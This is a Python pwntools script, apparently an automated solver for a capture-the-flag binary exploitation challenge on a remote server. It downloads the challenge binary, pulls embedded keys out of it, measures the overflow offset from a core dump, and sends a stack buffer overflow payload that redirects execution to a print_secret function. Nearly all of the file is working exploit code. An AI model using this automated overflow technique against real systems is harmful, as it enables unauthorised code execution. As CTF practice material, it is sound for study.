from pwn import *
from base64 import b85decode
import os,stat
ip = "ec2-3-120-126-243.eu-central-1.compute.amazonaws.com"
port =1337
context.log_level = "WARNING"


def rolling():
    globals()
    p=remote(ip,port)
    p.recvuntil("Mystery:\n\n\n")
    enc=p.recvuntil("\n").strip()
    enc = b85decode(enc)
    #print(enc)
    try:
        bin=open("in","wb")
        bin.write(enc)
        bin.close()
        os.system("strings in > out")
        os.chmod("in", os.stat("./in").st_mode | stat.S_IEXEC)
        out=open("out","r")
        output=out.read()
        out.close()
    except:
        os.remove("in")
        os.remove("out")
    keys=(output.split("Flag!!!\n"))[1].split("Please")[0].split("\n")[:-1]
    print(keys)
    for x in range(len(keys)):
        p.recvuntil("secret "+str(x+1)+"\n")
        p.sendline(keys[x])
    e=ELF("./in")
    context.binary="./in"
    buffer = buff(preroll(keys))*b'A'
    load= p64(e.functions["print_secret"].address)
    payload = buffer + load
    p.sendline(payload)
    p.recvuntil("!!!")
    print(p.recvuntil("}"))
    os.remove("in")
    os.remove("out")
    os.remove("./core")

def preroll(keys):
    p=process("./in")
    for x in range(len(keys)):
        p.recvuntil("secret "+str(x+1)+"\n")
        p.sendline(keys[x])
    p.clean()
    return p

def buff(pr):
    try:
        os.remove("./core")
    except:
        pass
    buff = cyclic(1000,n=8)
    pr.sendline(buff)
    sleep(2)
    try:
        context.log_level = "ERROR"
        core = Coredump("./core")
        context.log_level = "WARNING"
    except:
        print("too small")
        exit(0)
    if p64(core.fault_addr) not in buff:  # TODO does p instead of p64 work?
        print("tooo small")
        exit(0)
    else:
        context.log_level = "ERROR"
        fault=p64(core.fault_addr)
        tarBufLen = cyclic_find(fault, n=8)
        context.log_level = "WARNING"
        return tarBufLen

if __name__ == '__main__':
    rolling()